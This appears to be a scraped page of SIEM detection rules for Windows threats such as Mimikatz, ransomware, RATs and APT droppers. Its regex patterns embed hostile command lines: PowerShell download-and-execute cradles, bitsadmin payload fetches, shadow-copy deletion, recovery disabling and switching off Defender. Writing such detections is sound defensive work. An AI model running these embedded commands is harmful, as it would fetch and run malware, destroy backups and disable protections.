AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.11 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.11" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.10 (KHTML, like Gecko) Version/8.0.4 Safari/600.4.10" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:38.0) Gecko/20100101 Firefox/38.0" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:38.0) Gecko/20100101 Firefox/38.0" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:38.0) Gecko/20100101 Firefox/38.0" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:38.0) Gecko/20100101 Firefox/38.0" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0" or $selection.src.application = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0" or $selection.src.application = "Mozilla/4.0 (compatible; SPIPE/1.0" or $selection.src.application = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)" or $selection.src.application = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)" or $selection.src.application = "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)") condition: $selection 
<li><a href="#">rule microsoft_binary_github_communication { meta: author = "Michael Haag (idea), Florian Roth (rule)" description = "Detects an executable in the Windows folder accessing github.com License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "lateral_movement, t1105" events: ($selection.metadata.product_event_type = "3" and (re.regex($selection.target.hostname, `.*\.github\.com`) or re.regex($selection.target.hostname, `.*\.githubusercontent\.com`)) and re.regex($selection.target.process.file.full_path, `C:\\Windows\\.*`)) condition: $selection 
<li><a href="#">rule microsoft_binary_suspicious_communication_endpoint { meta: author = "Florian Roth" description = "Detects an executable in the Windows folder accessing suspicious domains License: ." reference = "" version = "0.01" created = "2018/08/30" product = "windows" service = "sysmon" mitre = "lateral_movement, t1105" events: ($selection.metadata.product_event_type = "3" and (re.regex($selection.target.hostname, `.*dl\.dropboxusercontent\.com`) or re.regex($selection.target.hostname, `.*\.pastebin\.com`)) and re.regex($selection.target.process.file.full_path, `C:\\Windows\\.*`)) condition: $selection 
<li><a href="#">rule microsoft_office_product_spawning_windows_shell { meta: author = "Michael Haag, Florian Roth, Markus Neis" description = "Detects a Windows command line executable started from Microsoft Word, Excel, Powerpoint, Publisher and Visio. License: ." reference = "" version = "0.01" created = "2018/04/06" category = "process_creation" product = "windows" mitre = "execution, defense_evasion, t1059, t1202, car.2013-02-003, car.2014-04-003" events: ((re.regex($selection.src.process.file.full_path, `.*\\WINWORD\.EXE`) or re.regex($selection.src.process.file.full_path, `.*\\EXCEL\.EXE`) or re.regex($selection.src.process.file.full_path, `.*\\POWERPNT\.exe`) or re.regex($selection.src.process.file.full_path, `.*\\MSPUB\.exe`) or re.regex($selection.src.process.file.full_path, `.*\\VISIO\.exe`) or re.regex($selection.src.process.file.full_path, `.*\\OUTLOOK\.EXE`)) and (re.regex($selection.target.process.file.full_path, `.*\\cmd\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\powershell\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\wscript\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\cscript\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\sh\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\bash\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\scrcons\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\schtasks\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\regsvr32\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\hh\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\wmic\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\mshta\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\rundll32\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\msiexec\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\forfiles\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\scriptrunner\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\mftrace\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\AppVLP\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\svchost\.exe`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule microsoft_teams_phishing_email { meta: author = "Osman Demir" description = "Detects Phishing Email License: ." reference = "" version = "0.01" created = "2021-03-09" category = "proxy" mitre = "T1192, initial_access" events: ($selection.security_result.action = "allowed" and ($selection.target.url = "" or $selection.target.url = "")) condition: $selection 
<li><a href="#">rule microsoft_workflow_compiler { meta: author = "Nik Seetharaman" description = "Detects invocation of Microsoft Workflow Compiler, which may permit the execution of arbitrary unsigned code. License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "defense_evasion, execution" events: (re.regex($selection.target.process.file.full_path, `.*\\Microsoft\.Workflow\.Compiler\.exe`) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule mimikatz_dc_sync { meta: author = "Benjamin Delpy, Florian Roth" description = "Detects Mimikatz DC sync security events License: ." reference = "" version = "0.01" created = "2018/06/03" product = "windows" service = "security" mitre = "credential_access, s0002, t1003" events: ($selection.metadata.product_event_type = "4662" and (re.regex($selection.target.process.file.file_metadata.pe.import_hash, `.*Replicating Directory Changes All.*`) or re.regex($selection.target.process.file.file_metadata.pe.import_hash, `.*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2.*`))) condition: $selection 
<li><a href="#">rule mimikatz_through_windows_remote_management { meta: author = "Patryk Prauze - ING Tech" description = "Detects usage of mimikatz through WinRM protocol by monitoring access to lsass process by wsmprovhost.exe. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "credential_access, execution, t1003, t1028, s0005" events: ($selection.metadata.product_event_type = "10" and $selection.target.process.file.full_path = "C:\\windows\\system32\\lsass.exe" and $selection.src.process.file.full_path = "C:\\Windows\\system32\\wsmprovhost.exe") condition: $selection 
<li><a href="#">rule mmc_spawning_windows_shell { meta: author = "Karneades, Swisscom CSIRT" description = "Detects a Windows command line executable started from MMC. License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "lateral_movement, t1175" events: (re.regex($selection.src.process.file.full_path, `.*\\mmc\.exe`) and (re.regex($selection.target.process.file.full_path, `.*\\cmd\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\powershell\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\wscript\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\cscript\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\sh\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\bash\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\reg\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\regsvr32\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\BITSADMIN.*`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule mmc20_lateral_movement { meta: author = "@2xxeformyshirt (Security Risk Advisors)" description = "Detects MMC20.Application Lateral Movement; specifically looks for the spawning of the parent MMC.exe with a command line of \"-Embedding\" as a child of svchost.exe License: ." reference = "" version = "0.01" created = "2020/03/04" category = "process_creation" product = "windows" mitre = "execution, t1175" events: (re.regex($selection.src.process.file.full_path, `.*\\svchost\.exe`) and re.regex($selection.target.process.file.full_path, `.*\\mmc\.exe`) and re.regex($selection.target.process.command_line, `.*-Embedding.*`) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule modification_of_windows_defender_service_settings_sysmon { meta: author = "Ariel Millahuel" description = "Detects modifications on Windows Defender Settings via Registry keys/values License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "defense_evasion, t1036" events: (($selection1.metadata.product_event_type = "13" and (re.regex($selection1.target.registry.registry_key, `.*\\SYSTEM\\ControlSet001\\services\\WinDefend`) or re.regex($selection1.target.registry.registry_key, `.*SOFTWARE\\Policies\\Microsoft\\Windows Defender`)) and $selection1.metadata.event_type = "SetValue") or ($selection1.target.process.file.full_path = "powershell.exe" and re.regex($selection1.target.process.command_line, `.* .*/c powershell Set-MpPreference -DisableRealtimeMonitoring $true .*`))) condition: $selection1 
<li><a href="#">rule monero_mining_detector { meta: author = "Lee Archinal" description = "This content detects activity relating to the Monero Cryptominer License: ." reference = "" version = "0.01" created = "2019/06/05" product = "windows" service = "sysmon" mitre = "Impact, attackt1496" events: (($selection1.metadata.product_event_type = "11" and (re.regex($selection1.target.file.full_path, `.*%Temp%\\kkk1\.log`) or re.regex($selection1.target.file.full_path, `.*%Temp%\\pp2\.log`) or re.regex($selection1.target.file.full_path, `.*%Temp%\\333\.log`) or re.regex($selection1.target.file.full_path, `.*%Temp%\\kk4\.log`) or re.regex($selection1.target.file.full_path, `.*%Temp%\\kk5\.log`))) or ($selection1.metadata.product_event_type = "1" and $selection1.target.process.file.full_path = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" and $selection1.target.process.command_line = "powershell -nop -w hidden -ep bypass { \"IEX (New-Object Net.WebClient).downloadstring\"")) condition: $selection1 
<li><a href="#">rule ms_office_product_spawning_exe_in_user_dir { meta: author = "Jason Lynch" description = "Detects an executable in the users directory started from Microsoft Word, Excel, Powerpoint, Publisher or Visio License: ." reference = "" version = "0.01" created = "2019/04/02" category = "process_creation" product = "windows" mitre = "execution, defense_evasion, t1059, t1202, FIN7, car.2013-05-002" events: ((re.regex($selection.src.process.file.full_path, `.*\\WINWORD\.EXE`) or re.regex($selection.src.process.file.full_path, `.*\\EXCEL\.EXE`) or re.regex($selection.src.process.file.full_path, `.*\\POWERPNT\.exe`) or re.regex($selection.src.process.file.full_path, `.*\\MSPUB\.exe`) or re.regex($selection.src.process.file.full_path, `.*\\VISIO\.exe`) or re.regex($selection.src.process.file.full_path, `.*\\OUTLOOK\.EXE`)) and re.regex($selection.target.process.file.full_path, `C:\\users\\.*\.exe`) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule mshta_downloads_malware_by_using_covid19_themed_document { meta: author = "Emir Erdogan" description = "SideWinder APT Group attacks by using COVID-19 document License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "T1129, T1170, T1064, T1129" events: (re.regex($selection1.src.process.file.full_path, `.*\\mshta\.exe`) and ($selection1.target.process.file.full_path = "C:\\Windows\\System32\\mshta.exe" or re.regex($selection1.target.process.file.full_path, `.*\\rekeywiz\.exe`)) and (re.regex($selection1.target.process.command_line, `.*966029e\.hta.*`) or re.regex($selection1.target.process.command_line, `.*rekeywiz\.exe.*`))) condition: $selection1 
<li><a href="#">rule mshta_spwaned_by_svchost_as_seen_in_lethalhta_sysmon { meta: author = "Markus Neis, Alexandr Yampolskyi" description = "Detects MSHTA.EXE spwaned by SVCHOST described in report. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "Execution, t1204, t1059" events: ($selection.metadata.product_event_type = "1" and re.regex($selection.src.process.file.full_path, `.*\\svchost\.exe`) and re.regex($selection.target.process.command_line, `.*/mshta\.exe`)) condition: $selection 
<li><a href="#">rule msiexec_web_install { meta: author = "Florian Roth" description = "Detects suspicious msiexec process starts with web addreses as parameter License: ." reference = "" version = "0.01" created = "2018/02/09" category = "process_creation" product = "windows" mitre = "defense_evasion, t1218.007, command_and_control, t1105" events: (re.regex($selection.target.process.command_line, `.* msiexec.*://.*`) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule mssql_server_backdoor_detection_vollgar { meta: author = "Emir Erdogan" description = "Newly discovered Vollgar attack uses brute force to infect vulnerable Microsoft SQL servers at a high rate. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "T1005, T1190" events: ($selection.metadata.product_event_type = "11" and ($selection.target.file.full_path = "C:\\ProgramData\\wget.vbs" or re.regex($selection.target.file.full_path, `.*\\SQLAGENTIDC\.exe`) or $selection.target.file.full_path = "C:\\RECYCLER\\wget.vbs" or $selection.target.file.full_path = "C:\\ProgramData\\emsda.vbs" or $selection.target.file.full_path = "C:\\RECYCLER\\emsda.vbs" or re.regex($selection.target.file.full_path, `.*\\SQLAGENTSWA\.exe`) or re.regex($selection.target.file.full_path, `.*\\SQLIOMDSD\.exe`) or re.regex($selection.target.file.full_path, `.*\\SQLSernsf\.exe`) or $selection.target.file.full_path = "C:\\Program Files (x86)\\Microsoft SQL Server\\SQLSerasi.exe" or $selection.target.file.full_path = "C:\\Users\\MSSQL~1\\AppData\\Local\\Temp\\startas.bat" or $selection.target.file.full_path = "C:\\Users\\MSSQLSERVER\\AppData\\Local\\Temp\\startas.bat" or $selection.target.file.full_path = "C:\\Windows\\Temp\\startas.bat" or $selection.target.file.full_path = "C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Temp\\startas.bat" or $selection.target.file.full_path = "C:\\Users\\MSSQLSERVER\\AppData\\Local\\Temp\\startae.bat" or $selection.target.file.full_path = "C:\\Windows\\Temp\\startae.bat" or $selection.target.file.full_path = "C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Temp\\startae.bat")) condition: $selection 
<li><a href="#">rule muddywater_apt_proxy { meta: author = "Alexandr Yampolskyi, SOC Prime" description = "MuddyWater APT Detector. License: ." reference = "" version = "0.01" created = "2018/11/28" product = "proxy" mitre = "Command and Control, t1071" events: ($selectionURL.target.url = "" or $selectionURL.target.url = "" or re.regex($selectionURL.target.url, `\.105\.6\.230//servlet/.*`) or $selectionURL.target.url = "") condition: $selectionURL 
<li><a href="#">rule mustang_panda_dropper { meta: author = "Florian Roth" description = "Detects specific process parameters as used by Mustang Panda droppers License: ." reference = "" version = "0.01" created = "2019/10/30" category = "process_creation" product = "windows" events: (($selection1.metadata.product_event_type = "4688" or $selection1.metadata.product_event_type = "1") and ((re.regex($selection1.target.process.command_line, `.*Temp\\wtask\.exe /create.*`) or re.regex($selection1.target.process.command_line, `.*%windir:~-3,1%%PUBLIC:~-9,1%.*`) or re.regex($selection1.target.process.command_line, `.*/E:vbscript .* C:\\Users.*\.txt\" /F`) or re.regex($selection1.target.process.command_line, `.*/tn \"Security Script .*`) or re.regex($selection1.target.process.command_line, `.*%windir:~-1,1%.*`)) or re.regex($selection1.target.process.file.full_path, `.*Temp\\winwsh\.exe`))) condition: $selection1 
<li><a href="#">rule mustangpanda_covid19_campaing { meta: author = "Ariel Millahuel" description = "This rule detects the attempts that are made by the ATP group MustangPanda in order to take advantage of the COVID-19 situation License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "execution, T1059" events: (($selection1.metadata.product_event_type = "4688" or $selection1.metadata.product_event_type = "1") and (($selection1.target.process.file.full_path = "cmd.exe" and (re.regex($selection1.target.process.command_line, `/c for %x in \(%temp%=%cd%\) do for /f \"delims==\" %i in \(dir %x.*-.*-1\.lnk /s /b\)do start mshta\.exe \"%i\"`) or re.regex($selection1.target.process.command_line, `/c dir \"C:\\Users.*\\AppData\\Local\\Temp.*-.*-1\.lnk\" /s /b`))) or ($selection1.target.process.file.full_path = "schtasks.exe" and $selection1.target.process.command_line = "/F /Create /TN Tencentid /sc minute /MO 1 /TR C:\\Users\\Public\\Music\\tencentsoso.exe"))) condition: $selection1 
<li><a href="#">rule mydoom_email_worm_detector_sysmon_behavior { meta: author = "Lee Archinal" description = "This content detects characteristics of the MyDoom strain of malware License: ." reference = "" version = "0.01" created = "2019/07/29" product = "windows" service = "sysmon" mitre = "collection, t1114" events: (((($selection1.metadata.product_event_type = "11" and $selection1.target.file.full_path = "C:\\Windows\\lsass.exe") or ($selection1.metadata.product_event_type = "13" and $selection1.target.registry.registry_key = "HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\Traybar" and $selection1.target.registry.registry_value_data = "C:\\Windows\\lsass.exe")) or ($selection1.metadata.product_event_type = "11" and (re.regex($selection1.target.file.full_path, `C:\\Users.*\\AppData\\Local\\Temp.*\\lsass\.exe`) or re.regex($selection1.target.file.full_path, `C:\\Users.*\\AppData\\Local\\Temp\\lsass\.exe`)))) or ($selection1.metadata.product_event_type = "1" and ($selection1.target.process.file.full_path = "C:\\Windows\\lsass.exe" or re.regex($selection1.target.process.file.full_path, `C:\\Users.*\\AppData\\Local\\Temp\\lsass\.exe`) or re.regex($selection1.target.process.file.full_path, `C:\\Users.*\\AppData\\Local\\Temp.*\\lsass\.exe`)))) condition: $selection1 
<li><a href="#">rule nanocore_rat_loaded_by_covid19_update_xlsm_file { meta: author = "Emir Erdogan" description = "NanoCore RAT Loaded By Covid-19 Update XLSM File License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "T1086, T1064, T1105" events: (re.regex($selection.src.process.file.full_path, `.*\\excel\.exe`) and re.regex($selection.target.process.file.full_path, `.*\\powershell\.exe`) and re.regex($selection.target.process.command_line, `.*-executionpolicy bypass -W Hidden -command \(new-object System\.Net\.WebClient\)\.DownloadFile\(.*gbud\.webd\.pl/cli/.*\.exe.*,$env:Temp\+.*\.exe.*\);\(New-Object -com Shell\.Application\)\.ShellExecute\($env:Temp\+.*\.exe.*\)`)) condition: $selection 
<li><a href="#">rule nemty_ransomware_lolbins_abuse { meta: author = "Ariel Millahuel" description = "Detects an attempt of Nemty Ransmoware in order to abuse LOLBins via command-line parameters License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "execution, T1197, S0190" events: (($selection1.metadata.product_event_type = "4688" or $selection1.metadata.product_event_type = "1") and (($selection1.target.process.file.full_path = "cmd.exe" and (re.regex($selection1.target.process.command_line, ` /c bitsadmin /transfer getitman /download /priority high http.*://.*\..*\..*\..*/jp\.exe %temp%.*\.exe&start %temp%.*\.exe,0,.*`) or re.regex($selection1.target.process.command_line, ` /c bitsadmin /transfer getitman /download /priority high https://.*\..*\..*\..*/.*\.exe %temp%.*\.exe&start %temp%.*\.exe,0,.*`))) or ($selection1.target.process.file.full_path = "bitsadmin.exe" and (re.regex($selection1.target.process.command_line, ` bitsadmin /transfer getitman /download /priority high http://.*\..*\..*\..*/jp\.exe %temp%.*\.exe&start %temp%.*\.exe,0,.*`) or re.regex($selection1.target.process.command_line, ` bitsadmin /transfer getitman /download /priority high https://.*\..*\..*\..*/.*\.exe %temp%.*\.exe&start %temp%.*\.exe,0,.*`))))) condition: $selection1 
<li><a href="#">rule nemty_successor_nefilimnephilim_ransomware { meta: author = "Emir Erdogan" description = "Ransomware families NEMTY, Nefilim and Nephilim continue to evolve and merge, taking on aspects of other successful variants that aim to encrypt and extort. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "T1486, T1490, T1089" events: (re.regex($selection.target.process.file.full_path, `.*\\cmd\.exe`) and re.regex($selection.target.process.command_line, `.*/c bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet & wmic shadowcopy delete`)) condition: $selection 
<li><a href="#">rule net_ipc_share_sysmon { meta: author = "Michael Haag, Alexandr Yampolskyi" description = "Detects net usage accessing IPC$. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "Execution, t1204, 1059" events: ($selection.metadata.product_event_type = "1" and $selection.target.process.file.full_path = "net.exe" and re.regex($selection.target.process.command_line, `.*ipc$.*`)) condition: $selection 
<li><a href="#">rule netexe_execution { meta: author = "Michael Haag, Mark Woan (improvements)" description = "Detects execution of Net.exe, whether suspicious or benign. License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "s0039, lateral_movement, discovery" events: ((re.regex($selection.target.process.file.full_path, `.*\\net\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\net1\.exe`)) and (re.regex($selection.target.process.command_line, `.* group.*`) or re.regex($selection.target.process.command_line, `.* localgroup.*`) or re.regex($selection.target.process.command_line, `.* user.*`) or re.regex($selection.target.process.command_line, `.* view.*`) or re.regex($selection.target.process.command_line, `.* share`) or re.regex($selection.target.process.command_line, `.* accounts.*`) or re.regex($selection.target.process.command_line, `.* use.*`) or re.regex($selection.target.process.command_line, `.* stop .*`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule netntlm_downgrade_attack { meta: author = "Florian Roth" description = "Detects post exploitation using NetNTLM downgrade attacks License: ." reference = "" version = "0.01" created = "2018/03/20" product = "windows" service = "sysmon" mitre = "credential_access, t1212" events: ($selection1.metadata.product_event_type = "13" and (re.regex($selection1.target.registry.registry_key, `.*SYSTEM\\.*ControlSet.*\\Control\\Lsa\\lmcompatibilitylevel`) or re.regex($selection1.target.registry.registry_key, `.*SYSTEM\\.*ControlSet.*\\Control\\Lsa\\NtlmMinClientSec`) or re.regex($selection1.target.registry.registry_key, `.*SYSTEM\\.*ControlSet.*\\Control\\Lsa\\RestrictSendingNTLMTraffic`))) condition: $selection1 
<li><a href="#">rule netntlm_downgrade_attack_part_1 { meta: author = "Florian Roth" description = "Detects post exploitation using NetNTLM downgrade attacks License: ." reference = "" version = "0.01" created = "2018/03/20" product = "windows" service = "security" mitre = "credential_access, t1212" events: ($selection2.metadata.product_event_type = "4657" and (re.regex($selection2.target.registry.registry_value_data, `REGISTRY\\MACHINE\\SYSTEM\\.*ControlSet.*\\Control\\Lsa`) or re.regex($selection2.target.file.full_path, `REGISTRY\\MACHINE\\SYSTEM\\.*ControlSet.*\\Control\\Lsa`)) and ($selection2.target.registry.registry_value_name = "LmCompatibilityLevel" or $selection2.target.registry.registry_value_name = "NtlmMinClientSec" or $selection2.target.registry.registry_value_name = "RestrictSendingNTLMTraffic")) condition: $selection2 
<li><a href="#">rule netsh_rdp_port_forwarding { meta: author = "Florian Roth" description = "Detects netsh commands that configure a port forwarding of port 3389 used for RDP. License: ." reference = "" version = "0.01" created = "2019/01/29" category = "process_creation" product = "windows" mitre = "lateral_movement" events: (re.regex($selection.target.process.command_line, `netsh i.* p.*=3389 c.*`) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule netwalker_ransomware_detection { meta: author = "Emir Erdogan" description = "Netwalker is a ransomware formerly called Mailto that has become active recently as it targets the enterprise and government agencies. Two widely reported attacks related to Netwalker are the ones on the Toll Group and the Champaign Urbana Public Health District (CHUPD) in Illinois. License: ." reference = "" version = "0.01" created = "2020/03/23" product = "windows" mitre = "t1486" events: (re.regex($selection.target.process.file.full_path, `.*vssadmin\.exe`) and re.regex($selection.src.process.file.full_path, `.*qeSw\.exe`) and $selection.target.process.command_line = "vssadmin.exe delete shadows /all /quiet") condition: $selection 
<li><a href="#">rule netwire_rat_detection_via_wscript { meta: author = "Florian Roth - Margaritis Dimitrios (Idea) Ariel Millahuel (Rule)" description = "Detects Netwire activity via WScript License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "execution, t1056, t1082" events: ((re.regex($selection.target.process.file.full_path, `.*\\wscript\.exe`) and (re.regex($selection.target.process.command_line, `.* C:\\Users\\.*\.vbs .*`) or re.regex($selection.target.process.command_line, `.* C:\\Users\\admin\\AppData\\.*\.vbs .*`) or re.regex($selection.target.process.command_line, `.* C:\\Users\\admin\\AppData\\OneDrive\.vbs .*`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) and not (re.regex($selection.src.process.file.full_path, `.*\\winrar.*`))) condition: $selection 
<li><a href="#">rule new_run_key_pointing_to_suspicious_folder { meta: author = "Florian Roth, Markus Neis" description = "Detects suspicious new RUN key element pointing to an executable in a suspicious folder License: ." reference = "" version = "0.01" created = "2018/08/25" product = "windows" service = "sysmon" mitre = "persistence, t1060" events: ($selection.metadata.product_event_type = "13" and (re.regex($selection.target.registry.registry_key, `.*\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\.*`) or re.regex($selection.target.registry.registry_key, `.*\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\.*`)) and (re.regex($selection.metadata.description, `C:\\Windows\\Temp\\.*`) or re.regex($selection.metadata.description, `.*\\AppData\\.*`) or re.regex($selection.metadata.description, `C:\\$Recycle\.bin\\.*`) or re.regex($selection.metadata.description, `C:\\Temp\\.*`) or re.regex($selection.metadata.description, `C:\\Users\\Public\\.*`) or re.regex($selection.metadata.description, `C:\\Users\\Default\\.*`) or re.regex($selection.metadata.description, `C:\\Users\\Desktop\\.*`))) condition: $selection 
<li><a href="#">rule njrat_cc_post_request { meta: author = "Joseph Kamau" description = "This rule detects the Command and Control POST request from the NJRAT once it is implanted on an endpoint sending the current status of the Host .e.g Anti-virus status, Operating system version, date of infection License: ." reference = "" version = "0.01" created = "2021-03-09" product = "proxy" mitre = "Command and Control, t1071" events: (re.regex($selection.target.url, `.*/is-ready`) and (re.regex($selection.src.application, `.*|>plus<|.*`) or re.regex($selection.src.application, `.*|>underworld final<|.*`))) condition: $selection 
<li><a href="#">rule njrat_ratbackdoor_proxy { meta: author = "Alexandr Yampolskyi, SOC Prime" description = "NjRAT RAT/Backdoor Detector. License: ." reference = "" version = "0.01" created = "2016/11/24" product = "proxy" mitre = "Command and Control, t1071" events: ($selectionURL.target.url = "" or $selectionURL.target.url = "" or $selectionURL.target.url = "" or $selectionURL.target.url = "" or $selectionURL.target.url = "" or $selectionURL.target.url = "" or $selectionURL.target.url = "" or $selectionURL.target.url = "" or $selectionURL.target.url = "" or $selectionURL.target.url = "") condition: $selectionURL 
